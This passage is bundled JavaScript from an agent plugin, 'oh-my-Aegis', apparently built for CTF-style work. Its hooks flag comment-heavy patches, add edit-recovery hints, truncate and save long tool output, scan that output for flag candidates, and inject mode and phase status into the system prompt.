            const looksLikePatch = text.includes("*** Begin Patch") || text.includes("diff --git") || /(^|\n)@@\s*[-+]?\d+/.test(text);
            if (looksLikePatch) {
              const addedLines = [];
              const lines = text.split(/\r?\n/);
              for (const line of lines) {
                if (!line.startsWith("+")) {
                  continue;
                }
                if (line.startsWith("+++")) {
                  continue;
                }
                const content = line.slice(1);
                if (!content.trim()) {
                  continue;
                }
                addedLines.push(content);
              }
              if (addedLines.length >= config3.comment_checker.min_added_lines) {
                const isCommentLine = (value) => {
                  const trimmed = value.trimStart();
                  if (!trimmed)
                    return false;
                  return trimmed.startsWith("//") || trimmed.startsWith("#") || trimmed.startsWith("/*") || trimmed.startsWith("*") || trimmed.startsWith("<!--");
                };
                const commentLines = addedLines.filter(isCommentLine);
                const ratio = addedLines.length > 0 ? commentLines.length / addedLines.length : 0;
                const aiSlopMarkers = ["as an ai", "chatgpt", "claude", "llm", "generated by", "ai-generated"];
                const aiSlopDetected = commentLines.some((line) => {
                  const lowered = line.toLowerCase();
                  return aiSlopMarkers.some((marker) => lowered.includes(marker));
                });
                const triggered = aiSlopDetected || ratio >= config3.comment_checker.max_comment_ratio || commentLines.length >= config3.comment_checker.max_comment_lines;
                if (triggered) {
                  const header = `[oh-my-Aegis comment-checker] added=${addedLines.length} comment=${commentLines.length} ratio=${ratio.toFixed(2)}${aiSlopDetected ? " ai_slop=detected" : ""}`;
                  const hint = "Hint: reduce non-essential comments (especially AI-style disclaimers).";
                  if (typeof output.output === "string" && !output.output.startsWith("[oh-my-Aegis comment-checker]")) {
                    output.output = `${header}
${hint}

${output.output}`;
                  }
                  safeNoteWrite("comment-checker", () => {
                    notesStore.recordScan(`${header} tool=${input.tool}`);
                  });
                }
              }
            }
          }
        }
        if (config3.recovery.enabled && config3.recovery.edit_error_hint) {
          const toolLower = String(input.tool || "").toLowerCase();
          if (toolLower === "edit" || toolLower === "write") {
            const lower = raw.toLowerCase();
            const hasPatchTerms = /(apply_patch|patch|hunk|anchor|offset|failed to apply)/i.test(lower);
            const hasFailureTerms = /(verification failed|failed|error|cannot|unable|not found|mismatch)/i.test(lower);
            if (hasPatchTerms && hasFailureTerms) {
              const hint = [
                "[oh-my-Aegis recovery]",
                "- Detected edit/patch application error.",
                "- Next: re-read the target file, shrink the patch hunk, and retry."
              ].join(`
`);
              if (typeof output.output === "string" && !output.output.startsWith("[oh-my-Aegis recovery]")) {
                output.output = `${hint}

${output.output}`;
              }
              safeNoteWrite("recovery.edit", () => {
                notesStore.recordScan(`Edit recovery hint emitted: tool=${input.tool}`);
              });
            }
          }
        }
        if (config3.tool_output_truncator.enabled) {
          const perTool = config3.tool_output_truncator.per_tool_max_chars ?? {};
          const configured = perTool[input.tool];
          const max = typeof configured === "number" && Number.isFinite(configured) ? configured : config3.tool_output_truncator.max_chars;
          if (typeof output.output === "string" && output.output.length > max) {
            const pre = output.output;
            const persistedOutput = config3.tool_output_truncator.persist_mask_sensitive ? maskSensitiveToolOutput(pre) : pre;
            const savedPath = writeToolOutputArtifact({
              sessionID: input.sessionID,
              tool: input.tool,
              callID: input.callID,
              title: originalTitle,
              output: persistedOutput
            });
            const headTarget = config3.tool_output_truncator.head_chars;
            const tailTarget = config3.tool_output_truncator.tail_chars;
            const safeHead = Math.max(0, Math.min(headTarget, max));
            const safeTail = Math.max(0, Math.min(tailTarget, Math.max(0, max - safeHead)));
            const truncated = truncateWithHeadTail(pre, safeHead, safeTail);
            const savedRel = savedPath && isPathInsideRoot(savedPath, ctx.directory) ? relative5(ctx.directory, savedPath) : savedPath;
            output.output = [
              "[oh-my-Aegis tool-output-truncated]",
              `- tool=${input.tool} callID=${input.callID}`,
              savedRel ? `- saved=${savedRel}` : "- saved=(failed)",
              `- original_chars=${pre.length}`,
              "",
              truncated
            ].join(`
`);
          }
        }
        if (config3.flag_detector?.enabled !== false) {
          const outputText = typeof output.output === "string" ? output.output : "";
          if (outputText.length > 0 && outputText.length < 1e5 && containsFlag(outputText)) {
            const flags = scanForFlags(outputText, `tool:${input.tool}`);
            if (flags.length > 0) {
              const alert = buildFlagAlert(flags);
              safeNoteWrite("flag-detector", () => {
                notesStore.recordScan(`Flag candidate detected in ${input.tool} output: ${flags.map((f) => f.flag).join(", ")}
${alert}`);
              });
            }
          }
        }
      } catch (error92) {
        noteHookError("tool.execute.after", error92);
      } finally {
        maybeRecordHookLatency("tool.execute.after", input, hookStartedAt);
      }
    },
    "experimental.chat.system.transform": async (input, output) => {
      if (!input.sessionID) {
        return;
      }
      const state = store.get(input.sessionID);
      const decision = route(state, config3);
      const systemLines = [
        `MODE: ${state.mode}`,
        `PHASE: ${state.phase}`,
        `TARGET: ${state.targetType}`,
        `ULTRAWORK: ${state.ultraworkEnabled ? "ENABLED" : "DISABLED"}`,
        `NEXT_ROUTE: ${decision.primary} (${decision.reason})`,
        "",
        buildPhaseInstruction(state),
        ""
      ];
      const signalGuidance = buildSignalGuidance(state);
      if (signalGuidance.length > 0) {
        systemLines.push(...signalGuidance, "");
      }
      systemLines.push(buildToolGuide(state), "");
      const playbook = buildTaskPlaybook(state, config3);
      if (playbook) {
        systemLines.push(playbook, "");
      }
      systemLines.push(`RULE: each loop must maintain plan + todo list (multiple todos allowed, one in_progress), then verify/log.`);
      if (state.ultraworkEnabled) {
        systemLines.push(`RULE: ultrawork enabled - do not stop without verified evidence.`);
      }
      output.system.push(systemLines.join(`
`));
    },
    "experimental.session.compacting": async (input, output) => {
      const state = store.get(input.sessionID);
      output.context.push(`orchestrator-state: mode=${state.mode}, phase=${state.phase}, target=${state.targetType}, verifyFailCount=${state.verifyFailCount}`);
      output.context.push(`markdown-budgets: WORKLOG ${config3.markdown_budget.worklog_lines} lines/${config3.markdown_budget.worklog_bytes} bytes; EVIDENCE ${config3.markdown_budget.evidence_lines}/${config3.markdown_budget.evidence_bytes}`);
      try {
        const root = notesStore.getRootDirectory();
        const contextPackPath = join17(root, "CONTEXT_PACK.md");
        if (existsSync16(contextPackPath)) {
          const text = readFileSync13(contextPackPath, "utf-8").trim();
          if (text) {
            output.context.push(`durable-context:
${text.slice(0, 16000)}`);
          }
        }
        const planPath = join17(root, "PLAN.md");
        if (existsSync16(planPath)) {
          const text = readFileSync13(planPath, "utf-8").trim();
          if (text) {
            output.context.push(`durable-plan:
${text.slice(0, 12000)}`);
          }
        }
      } catch (error92) {
        noteHookError("session.compacting", error92);
      }
    },
    "experimental.text.complete": async (input, output) => {
      try {
        if (config3.recovery.enabled && config3.recovery.thinking_block_validator) {
          const fixed = sanitizeThinkingBlocks(output.text);
          if (fixed !== null) {
            output.text = fixed;
            safeNoteWrite("thinking-block-validator", () => {
              notesStore.recordScan(`Thinking block validator applied: session=${input.sessionID} message=${input.messageID}`);
            });
          }
        }
        if (!config3.recovery.enabled || !config3.recovery.empty_message_sanitizer) {
          return;
        }
        if (output.text.trim().length > 0) {
          return;
        }
        output.text = "[oh-my-Aegis recovery] Empty message recovered. Please retry the last step.";
        safeNoteWrite("recovery.empty", () => {
          notesStore.recordScan(`Empty message sanitized: session=${input.sessionID} message=${input.messageID} part=${input.partID}`);
        });
      } catch (error92) {
        noteHookError("text.complete", error92);
      }
    }
  };
};
var index_core_default = OhMyAegisPlugin;

// src/index.ts
var src_default = index_core_default;
export {
  src_default as default
};
